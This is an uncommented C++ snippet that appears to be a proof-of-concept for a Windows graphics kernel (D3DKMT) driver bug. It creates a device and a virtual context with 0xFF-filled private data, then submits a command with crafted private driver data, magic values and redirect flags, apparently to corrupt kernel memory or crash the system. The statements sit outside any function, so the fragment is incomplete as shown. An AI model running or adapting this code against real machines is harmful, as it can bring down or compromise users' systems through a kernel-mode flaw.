#include <Windows.h>
#include <d3dkmthk.h>

D3DKMT_CREATEDEVICE* device = NULL;
device = new D3DKMT_CREATEDEVICE();

D3DKMT_ENUMADAPTERS enumAdapter = { 0 };
D3DKMTEnumAdapters(&enumAdapter);
device->hAdapter = enumAdapter.Adapters[1].hAdapter;

D3DKMTCreateDevice(device);

D3DKMT_CREATECONTEXTVIRTUAL* contextVirtual = NULL;
contextVirtual = new D3DKMT_CREATECONTEXTVIRTUAL();
memset(contextVirtual, 0, sizeof(D3DKMT_CREATECONTEXTVIRTUAL));

contextVirtual->hDevice = device->hDevice;

char data[0x200] = { 0 };
memset(data, 0xff, 0x200);

contextVirtual->PrivateDriverDataSize = 0x200;
contextVirtual->pPrivateDriverData = data;

contextVirtual->ClientHint = D3DKMT_CLIENTHINT_DX10;
contextVirtual->Flags.InitialData = 0x000001;
contextVirtual->Flags.NullRendering = 0x0;

D3DKMT_SUBMITCOMMAND* submitCommand = NULL;
submitCommand = new D3DKMT_SUBMITCOMMAND();

submitCommand->BroadcastContext[0] = 0x40000240;

for (int i = 0; i < 0x10; i++)
     submitCommand->WrittenPrimaries[i] = 0x0;

submitCommand->PresentHistoryToken = 0x100;
submitCommand->Commands = 0x004b39;
submitCommand->CommandLength = 0x00000d;
submitCommand->BroadcastContext[0] = contextVirtual->hContext;
submitCommand->BroadcastContextCount = 0x1;
submitCommand->Flags.PresentRedirected = 0x1;

submitCommand->PrivateDriverDataSize = 0x130;

char* PrivateData = NULL;
PrivateData = new char[submitCommand->PrivateDriverDataSize];
memset(PrivateData, 0x00, submitCommand->PrivateDriverDataSize);

*(DWORD*)(PrivateData + 0x118) = 0x434e5953;
*(DWORD*)(PrivateData + 0x11c) = 0x18;
*(DWORD*)(PrivateData + 0x120) = 0x000110;
*(DWORD*)(PrivateData + 0x124) = 0x000420;
*(DWORD*)(PrivateData + 0x128) = 0x0;
*(DWORD*)(PrivateData + 0x12c) = 0x000428;

submitCommand->pPrivateDriverData = PrivateData;

D3DKMTSubmitCommand(submitCommand);